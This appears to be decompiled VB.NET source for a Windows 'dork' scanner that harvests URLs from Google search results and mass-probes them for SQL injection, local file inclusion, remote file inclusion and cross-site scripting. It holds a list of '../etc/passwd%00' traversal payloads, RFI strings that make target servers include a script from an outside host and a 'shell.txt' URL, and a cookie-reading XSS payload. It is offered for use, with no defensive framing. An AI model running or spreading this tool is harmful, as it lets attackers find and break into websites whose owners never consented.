Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Text.RegularExpressions

Public Class frmMain

    Public Sub New()
        AddHandler MyBase.Load, AddressOf Me.xplit_Load
        Me.InitializeComponent()
    End Sub

    Public Delegate Sub _chkadder(item As String)

    Public Delegate Sub progadd(value As Integer)

    Public Delegate Sub _chkdadder(lnk As String)

    Public Delegate Sub prgmax(max As Integer)

    Private pg As Integer

    Private dork As String

    Private dom As String

    Private Sub loadb_Click(sender As Object, e As EventArgs) Handles loadb.Click
        Me.loader.ShowDialog()
    End Sub

    Private Sub saveb_Click(sender As Object, e As EventArgs) Handles saveb.Click
        Me.saver.ShowDialog()
    End Sub

    Private Sub loader_FileOk(sender As Object, e As CancelEventArgs) Handles loader.FileOk
        Dim streamReader As StreamReader = New StreamReader(Me.loader.FileName)
        While streamReader.Peek() > -1
            Dim text As String = streamReader.ReadLine()
            If text.ToString().StartsWith("http://", StringComparison.CurrentCultureIgnoreCase) Then
                Me.chklist.Items.Add(text)
            End If
        End While
        streamReader.Close()
    End Sub

    Private Sub saver_FileOk(sender As Object, e As CancelEventArgs) Handles saver.FileOk
        Dim streamWriter As StreamWriter = New StreamWriter(Me.saver.FileName)
        Dim arg_25_0 As Integer = 0
        Dim num As Integer = Me.chkdlist.Items.Count - 1
        For i As Integer = arg_25_0 To num
            streamWriter.WriteLine(Me.chkdlist.Items(i).ToString())
        Next
        streamWriter.Close()
    End Sub

    Private Sub clearb_Click(sender As Object, e As EventArgs) Handles clearb.Click
        Me.chklist.Items.Clear()
        Me.sf.Text = Conversions.ToString(0)
        Me.sc.Text = Conversions.ToString(0)
    End Sub

    Private Sub clear2b_Click(sender As Object, e As EventArgs) Handles clear2b.Click
        Me.chkdlist.Items.Clear()
        Me.vs.Text = Conversions.ToString(0)
        Me.sc.Text = Conversions.ToString(0)
    End Sub



    Private Sub xplit_Load(ByVal sender As Object, ByVal e As EventArgs)
        System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = False
        Dim NnNnNnNnaa As New System.Threading.Thread(New System.Threading.ThreadStart(AddressOf Me.mainloader)) : NnNnNnNnaa.Start()
        Me.ssqli.Checked = True
        Me.domainbox.Enabled = False
    End Sub








    Private Sub domain_CheckedChanged(sender As Object, e As EventArgs) Handles domain.CheckedChanged
        If Me.domain.Checked Then
            Me.domainbox.Enabled = True
        Else
            Me.domainbox.Enabled = False
        End If
    End Sub

    Private Function getsrc(url As String) As String
        Dim result As String
        Try
            Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create(url), HttpWebRequest)
            If url.ToString().Contains("etc/passwd") Then
                httpWebRequest.Timeout = 10000
            End If
            Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
            Dim streamReader As StreamReader = New StreamReader(httpWebResponse.GetResponseStream())
            Dim text As String = streamReader.ReadToEnd()
            httpWebResponse.Close()
            result = text
        Catch arg_54_0 As Exception
            ProjectData.SetProjectError(arg_54_0)
            result = Nothing
            ProjectData.ClearProjectError()
        End Try
        Return result
    End Function




    Private Sub chkadder(ByVal link As String)
        If (Me.chklist.InvokeRequired) Then
            Me.Invoke(New _chkadder(AddressOf Me.chkadder), New Object() {link})
        Else
            Me.chklist.Items.Add(link)
        End If
    End Sub






    Public Function URLDecode(StringToDecode As String) As String
        Dim text As String = String.Empty
        Dim num As Integer = 1
        While num - 1 <> Strings.Len(StringToDecode)
            Dim left As String = Strings.Mid(StringToDecode, num, 1)
            If Operators.CompareString(left, "+", False) = 0 Then
                text += " "
            Else
                If Operators.CompareString(left, "%", False) = 0 Then
                    text += Conversions.ToString(Strings.Chr(CInt(Math.Round(Conversion.Val("&h" + Strings.Mid(StringToDecode, num + 1, 2))))))
                    num += 2
                Else
                    text += Strings.Mid(StringToDecode, num, 1)
                End If
            End If
            num += 1
        End While
        Return text
    End Function

    Private Sub getlnks(src As String)
        Try
            Dim regex As Regex = New Regex("\bhref\S*=""/url\?q=(http://\S*?)&amp")
            Dim matchCollection As MatchCollection = regex.Matches(src)
            Try
                Dim enumerator As IEnumerator = matchCollection.GetEnumerator()
                While enumerator.MoveNext()
                    Dim match As Match = CType(enumerator.Current, Match)
                    If match.Groups(1).Value.ToString().StartsWith("http://", StringComparison.CurrentCultureIgnoreCase) AndAlso Not (match.Groups(1).Value.ToString().Contains("www.google.com") Or match.Groups(1).Value.ToString().Contains("www.youtube.com") Or match.Groups(1).Value.ToString().Contains("page2rss.com")) AndAlso Me.URLDecode(match.Groups(1).Value.ToString()).Contains("=") AndAlso Me.chklist.InvokeRequired Then
                        Me.chkadder(Me.URLDecode(match.Groups(1).Value.ToString()))
                    End If
                End While
            Finally
                Dim enumerator As IEnumerator
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        Catch expr_134 As Exception
            ProjectData.SetProjectError(expr_134)
            Dim ex As Exception = expr_134
            MessageBox.Show(ex.Message)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub dorkscanner_DoWork(sender As Object, e As DoWorkEventArgs) Handles dorkscanner.DoWork
        Dim arg_0A_0 As Integer = 0
        Dim num As Integer = Me.pg - 1
        For i As Integer = arg_0A_0 To num
            If Me.dorkscanner.CancellationPending Then
                Exit For
            End If
            Dim url As String
            If Me.domain.Checked Then
                url = String.Concat(New String() {"https://www.google.com/search?q=", Me.dorkbox.Text, " site:", Me.domainbox.Text, "&hl=en&num=100&start=", Conversions.ToString(i), "00"})
            Else
                url = String.Concat(New String() {"https://www.google.com/search?q=", Me.dorkbox.Text, "&hl=en&num=100&start=", Conversions.ToString(i), "00"})
            End If
            Dim text As String = Me.getsrc(url)
            If Operators.CompareString(text, Nothing, False) <> 0 Then
                Me.getlnks(text)
            End If
        Next
    End Sub

    Private Sub searchb_Click(sender As Object, e As EventArgs) Handles searchb.Click
        Me.dork = Me.dorkbox.Text
        Me.dom = Me.domainbox.Text
        Me.pg = Conversions.ToInteger(Me.pages.Text)
        Try
            If Operators.CompareString(Me.dork, "", False) = 0 Then
                MessageBox.Show("PLease enter the dork", "Dork Missing", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            Else
                If Me.domain.Checked And Operators.CompareString(Me.dom, "", False) = 0 Then
                    MessageBox.Show("PLease mention the domain", "Domain Missing", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                Else
                    Try
                        Dim enumerator As IEnumerator = Me.GroupBox1.Controls.GetEnumerator()
                        While enumerator.MoveNext()
                            Dim control As Control = CType(enumerator.Current, Control)
                            If Operators.CompareString(control.Name, "stopb", False) <> 0 Then
                                control.Enabled = False
                            End If
                        End While
                    Finally
                        Dim enumerator As IEnumerator
                        If TypeOf enumerator Is IDisposable Then
                            TryCast(enumerator, IDisposable).Dispose()
                        End If
                    End Try
                    Me.dorkscanner.RunWorkerAsync()
                End If
            End If
        Catch expr_103 As Exception
            ProjectData.SetProjectError(expr_103)
            Dim ex As Exception = expr_103
            MessageBox.Show(ex.Message)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub dorkscanner_RunWorkerCompleted(sender As Object, e As RunWorkerCompletedEventArgs) Handles dorkscanner.RunWorkerCompleted
        Try
            Dim enumerator As IEnumerator = Me.GroupBox1.Controls.GetEnumerator()
            While enumerator.MoveNext()
                Dim control As Control = CType(enumerator.Current, Control)
                If Operators.CompareString(control.Name, "stopb", False) <> 0 And Operators.CompareString(control.Name, "proxyb", False) <> 0 Then
                    control.Enabled = True
                End If
            End While
        Finally
            Dim enumerator As IEnumerator
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Me.ProgressBar1.Maximum = Me.chklist.Items.Count
        Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
        Me.vs.Text = Conversions.ToString(Me.chkdlist.Items.Count)
    End Sub

    Private Sub stopb_Click(sender As Object, e As EventArgs) Handles stopb.Click
        If Me.dorkscanner.IsBusy Then
            Me.dorkscanner.CancelAsync()
        End If
    End Sub

    Private Sub cloneb_Click(sender As Object, e As EventArgs) Handles cloneb.Click
        Dim list As List(Of String) = New List(Of String)()
        Dim arg_1B_0 As Integer = 0
        Dim num As Integer = Me.chklist.Items.Count - 1
        For i As Integer = arg_1B_0 To num
            Dim arg_38_0 As Integer = i + 1
            Dim num2 As Integer = Me.chklist.Items.Count - 1
            For j As Integer = arg_38_0 To num2
                If Me.chklist.Items(j).ToString().ToLower().Split(New Char() {"."}).GetValue(1).ToString().Contains(Me.chklist.Items(i).ToString().ToLower().Split(New Char() {"."}).GetValue(1).ToString()) AndAlso Not list.Contains(Conversions.ToString(Me.chklist.Items(j))) Then
                    list.Add(Conversions.ToString(Me.chklist.Items(j)))
                End If
            Next
        Next
        Try
            Dim enumerator As List(Of String).Enumerator = list.GetEnumerator()
            While enumerator.MoveNext()
                Dim current As String = enumerator.Current
                Me.chklist.Items.Remove(current)
            End While
        Finally
            Dim enumerator As List(Of String).Enumerator
            CType(enumerator, IDisposable).Dispose()
        End Try
        list.Clear()
        Me.ProgressBar1.Maximum = Me.chklist.Items.Count
        Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
        Me.vs.Text = Conversions.ToString(Me.chkdlist.Items.Count)
    End Sub

    Private Sub stop2b_Click(sender As Object, e As EventArgs) Handles stop2b.Click
        If Me.scnr.IsBusy Then
            Me.scnr.CancelAsync()
        End If
    End Sub

    Private Sub startb_Click(sender As Object, e As EventArgs) Handles startb.Click
        Try
            Dim enumerator As IEnumerator = Me.GroupBox1.Controls.GetEnumerator()
            While enumerator.MoveNext()
                Dim control As Control = CType(enumerator.Current, Control)
                If Operators.CompareString(control.Name, "stop2b", False) <> 0 Then
                    control.Enabled = False
                End If
            End While
        Finally
            Dim enumerator As IEnumerator
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Try
            Dim enumerator2 As IEnumerator = Me.GroupBox2.Controls.GetEnumerator()
            While enumerator2.MoveNext()
                Dim control2 As Control = CType(enumerator2.Current, Control)
                control2.Enabled = False
            End While
        Finally
            Dim enumerator2 As IEnumerator
            If TypeOf enumerator2 Is IDisposable Then
                TryCast(enumerator2, IDisposable).Dispose()
            End If
        End Try
        Me.scnr.RunWorkerAsync()
    End Sub

    Private Sub progadder(ByVal value As Int32)
        If (Me.ProgressBar1.InvokeRequired) Then
            Me.Invoke(New progadd(AddressOf Me.progadder), New Object() {CType(value, Integer)})
        Else
            Dim progressbar1 As System.Windows.Forms.ProgressBar = Me.ProgressBar1
            progressbar1.Value = (progressbar1.Value + 1)
        End If
    End Sub


    Private Sub scnr_DoWork(sender As Object, e As DoWorkEventArgs) Handles scnr.DoWork
        Try
            If Me.ssqli.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator.MoveNext()
                        Dim objectValue As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
                        If Me.scnr.CancellationPending Then
                            Exit While
                        End If
                        Dim text As String = Me.getsrc(objectValue.ToString().Replace("=", "='").ToString())
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        If Operators.CompareString(text, Nothing, False) <> 0 AndAlso Me.esqli(text) Then
                            Me.chkdadder(objectValue.ToString())
                            toolStripStatusLabel = Me.vs
                            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        End If
                        ' The following expression was wrapped in a checked-expression
                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                    End While
                Finally
                    Dim enumerator As IEnumerator
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
            If Me.lfi.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator2 As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator2.MoveNext()
                        Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(enumerator2.Current)
                        If Me.scnr.CancellationPending Then
                            Exit While
                        End If
                        Dim text As String = Me.getsrc((objectValue2.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", "=Gr3eNoXchker.php%00"))
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        If Operators.CompareString(text, Nothing, False) <> 0 AndAlso Me.elfi(text) Then
                            Me.chkdadder((objectValue2.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", "=/etc/passwd%00"))
                            toolStripStatusLabel = Me.vs
                            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        End If

                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                    End While
                Finally
                    Dim enumerator2 As IEnumerator
                    If TypeOf enumerator2 Is IDisposable Then
                        TryCast(enumerator2, IDisposable).Dispose()
                    End If
                End Try
            End If
            If Me.lfifuzz.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator3 As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator3.MoveNext()
                        Dim objectValue3 As Object = RuntimeHelpers.GetObjectValue(enumerator3.Current)
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        Try
                            Dim enumerator4 As IEnumerator = Me.fuzzlist.Items.GetEnumerator()
                            While enumerator4.MoveNext()
                                Dim objectValue4 As Object = RuntimeHelpers.GetObjectValue(enumerator4.Current)
                                If Me.scnr.CancellationPending Then
                                    Exit While
                                End If
                                Dim text As String = Me.getsrc((objectValue3.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", objectValue4.ToString()))
                                If Operators.CompareString(text, Nothing, False) <> 0 AndAlso Me.efuzzlfi(text) Then
                                    Me.chkdadder((objectValue3.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", objectValue4.ToString()))
                                    toolStripStatusLabel = Me.vs
                                    toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                                    Exit While
                                End If
                                toolStripStatusLabel = Me.fs
                                toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                            End While
                        Finally
                            Dim enumerator4 As IEnumerator
                            If TypeOf enumerator4 Is IDisposable Then
                                TryCast(enumerator4, IDisposable).Dispose()
                            End If
                        End Try
                        ' The following expression was wrapped in a checked-expression
                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        Me.fs.Text = Conversions.ToString(0)
                    End While
                Finally
                    Dim enumerator3 As IEnumerator
                    If TypeOf enumerator3 Is IDisposable Then
                        TryCast(enumerator3, IDisposable).Dispose()
                    End If
                End Try
            End If
            If Me.rfi.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator5 As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator5.MoveNext()
                        Dim objectValue5 As Object = RuntimeHelpers.GetObjectValue(enumerator5.Current)
                        If Me.scnr.CancellationPending Then
                            Exit While
                        End If
                        Dim text As String = Me.getsrc((objectValue5.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", "=http://gr3enox.net23.net/Checker.php%00"))
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        If Operators.CompareString(text, Nothing, False) <> 0 AndAlso Me.erfi(text) Then
                            Me.chkdadder((objectValue5.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", "=http://www.site.com/shell.txt?%00"))
                            toolStripStatusLabel = Me.vs
                            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        End If
                        ' The following expression was wrapped in a checked-expression
                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                    End While
                Finally
                    Dim enumerator5 As IEnumerator
                    If TypeOf enumerator5 Is IDisposable Then
                        TryCast(enumerator5, IDisposable).Dispose()
                    End If
                End Try
            End If
            If Me.xss.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator6 As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator6.MoveNext()
                        Dim objectValue6 As Object = RuntimeHelpers.GetObjectValue(enumerator6.Current)
                        If Me.scnr.CancellationPending Then
                            Exit While
                        End If
                        Dim text As String = Me.getsrc(objectValue6.ToString() + """><script>alert(document.cookie)</script>")
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        If text IsNot Nothing AndAlso Me.exss(text) Then
                            Me.chkdadder(objectValue6.ToString())
                            toolStripStatusLabel = Me.vs
                            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        End If

                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                    End While
                Finally
                    Dim enumerator6 As IEnumerator
                    If TypeOf enumerator6 Is IDisposable Then
                        TryCast(enumerator6, IDisposable).Dispose()
                    End If
                End Try
            End If
        Catch expr_8BA As Exception
            ProjectData.SetProjectError(expr_8BA)
            Dim ex As Exception = expr_8BA
            MessageBox.Show(ex.Message)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub chkdadder(ByVal link As String)
        If (Me.chkdlist.InvokeRequired) Then
            Me.Invoke(New _chkdadder(AddressOf Me.chkdadder), New Object() {link})
        Else
            Me.chkdlist.Items.Add(link.ToString())
        End If
    End Sub


    Private Function esqli(src As String) As Boolean
        Dim result As Boolean
        Try
            Dim enumerator As IEnumerator = Me.sqlerrlist.Items.GetEnumerator()
            While enumerator.MoveNext()
                Dim text As String = Conversions.ToString(enumerator.Current)
                If src.Contains(text.ToString()) Then
                    result = True
                    Exit While
                End If
            End While
        Finally
            Dim enumerator As IEnumerator
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Return result
    End Function

    Private Sub mainloader()
        Me.sqlerrlist.Items.Add("mysql_num_rows()")
        Me.sqlerrlist.Items.Add("mysql_fetch_array()")
        Me.sqlerrlist.Items.Add("Error Occurred While Processing Request")
        Me.sqlerrlist.Items.Add("Server Error in '/' Application")
        Me.sqlerrlist.Items.Add("Microsoft OLE DB Provider for ODBC Drivers error")
        Me.sqlerrlist.Items.Add("error in your SQL syntax")
        Me.sqlerrlist.Items.Add("Invalid Querystring")
        Me.sqlerrlist.Items.Add("OLE DB Provider for ODBC")
        Me.sqlerrlist.Items.Add("VBScript Runtime")
        Me.sqlerrlist.Items.Add("ADODB.Field")
        Me.sqlerrlist.Items.Add("BOF or EOF")
        Me.sqlerrlist.Items.Add("ADODB.Command")
        Me.sqlerrlist.Items.Add("mysql_fetch_row()")
        Me.sqlerrlist.Items.Add("Syntax error")
        Me.sqlerrlist.Items.Add("include()")
        Me.sqlerrlist.Items.Add("mysql_fetch_assoc()")
        Me.sqlerrlist.Items.Add("mysql_fetch_object()")
        Me.sqlerrlist.Items.Add("mysql_numrows()")
        Me.sqlerrlist.Items.Add("GetArray()")
        Me.sqlerrlist.Items.Add("FetchRow()")
        Me.sqlerrlist.Items.Add("Input string was not in a correct format")
        Me.sqlerrlist.Items.Add("There was an error querying the database")
        Me.sqlerrlist.Items.Add("[SQLServer JDBC Driver]")
        Me.sqlerrlist.Items.Add("this page cannot be displayed")
        Me.sqlerrlist.Items.Add("fetch_row")
        Me.sqlerrlist.Items.Add("DatbaseQueryException")
        Me.sqlerrlist.Items.Add("coldfusion.tagext")
        Me.sqlerrlist.Items.Add("error in your SQL syntax")
        Me.sqlerrlist.Items.Add("mysql_result(")
        Me.sqlerrlist.Items.Add("supplied argument is not a valid MySQL result")
        Me.sqlerrlist.Items.Add("mysql_fetch_array")
        Me.sqlerrlist.Items.Add("sql_numrows(")
        Me.sqlerrlist.Items.Add("call to undefined function")
        Me.sqlerrlist.Items.Add("mysql_result(")
        Me.sqlerrlist.Items.Add("supplied argument is not a valid MySQL result")
        Me.sqlerrlist.Items.Add("mysql_fetch_array")
        Me.sqlerrlist.Items.Add("sql_numrows(")
        Me.sqlerrlist.Items.Add("fetchrow(")
        Me.sqlerrlist.Items.Add("][ODBC Socket]")
        Me.sqlerrlist.Items.Add("][ODBC")
        Me.sqlerrlist.Items.Add("Error Executing Database Query")
        Me.sqlerrlist.Items.Add("SequeLink JDBC Driver")
        Me.sqlerrlist.Items.Add("Microsoft OLE DB")
        Me.sqlerrlist.Items.Add("error '80040e14'")
        Me.sqlerrlist.Items.Add("Provider for ODBC Drivers")
        Me.sqlerrlist.Items.Add("java.sql.SQLException")
        Me.sqlerrlist.Items.Add("VENDORERRORCODE")
        Me.sqlerrlist.Items.Add("</CFQUERY>")
        Me.sqlerrlist.Items.Add("Microsoft VBScript runtime error '800a000d'")
        Me.sqlerrlist.Items.Add("Type mismatch:")
        Me.sqlerrlist.Items.Add("error '800a000d'")
        Me.sqlerrlist.Items.Add("Microsoft VBScript runtime")
        Me.sqlerrlist.Items.Add("Microsoft OLE DB Provider for SQL Server")
        Me.sqlerrlist.Items.Add("error '80040e14")
        Me.sqlerrlist.Items.Add("Unclosed quotation mark after the character string")
        Me.sqlerrlist.Items.Add("Type mismatch: '[string: &quot;'37937&quot;]'")
        Me.sqlerrlist.Items.Add("Microsoft VBScript runtime")
        Me.sqlerrlist.Items.Add("Microsoft VBScript runtime")
        Me.fuzzlist.Items.Add("=../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../../../../../etc/passwd%00")
    End Sub

    Private Sub scnr_RunWorkerCompleted(sender As Object, e As RunWorkerCompletedEventArgs) Handles scnr.RunWorkerCompleted
        Try
            Dim enumerator As IEnumerator = Me.GroupBox1.Controls.GetEnumerator()
            While enumerator.MoveNext()
                Dim control As Control = CType(enumerator.Current, Control)
                If Operators.CompareString(control.Name, "proxyb", False) <> 0 Then
                    control.Enabled = True
                End If
            End While
        Finally
            Dim enumerator As IEnumerator
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Try
            Dim enumerator2 As IEnumerator = Me.GroupBox2.Controls.GetEnumerator()
            While enumerator2.MoveNext()
                Dim control2 As Control = CType(enumerator2.Current, Control)
                If Operators.CompareString(control2.Name, "fsqli", False) <> 0 Then
                    control2.Enabled = True
                End If
            End While
        Finally
            Dim enumerator2 As IEnumerator
            If TypeOf enumerator2 Is IDisposable Then
                TryCast(enumerator2, IDisposable).Dispose()
            End If
        End Try
        Me.ProgressBar1.Value = 0
        Me.sc.Text = Conversions.ToString(0)
        Me.fs.Text = Conversions.ToString(0)
    End Sub

    Private Function elfi(src As String) As Boolean
        Return src.Contains("file not found") Or src.Contains("error: the listener returned the following message: 404 not found") Or src.Contains("http/1.0 404 object not found") Or src.Contains("the file that you requested could not be found on this server. if you provided the url")
    End Function

    Private Function erfi(src As String) As Boolean
        Return src.Contains("I 4m H3r3")
    End Function

    Private Function efuzzlfi(src As String) As Boolean
        Return src.Contains("root:")
    End Function

    Private Function exss(src As String) As Boolean
        Return src.Contains("""><script>alert(document.cookie)</script>") OrElse src.Contains("%22%22%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%22")
    End Function

    Private Sub progmax(ByVal max As Int32)
        If (Me.ProgressBar1.InvokeRequired) Then
            Me.Invoke(New prgmax(AddressOf Me.progmax), New Object() {CType(max, Integer)})
        Else
            Me.ProgressBar1.Maximum = max
        End If
    End Sub


    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Try
            Clipboard.SetText(Me.chkdlist.SelectedItem.ToString())
        Catch arg_17_0 As Exception
            ProjectData.SetProjectError(arg_17_0)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub proxyb_Click(sender As Object, e As EventArgs) Handles proxyb.Click
        frmDork.Show()
    End Sub
End Class
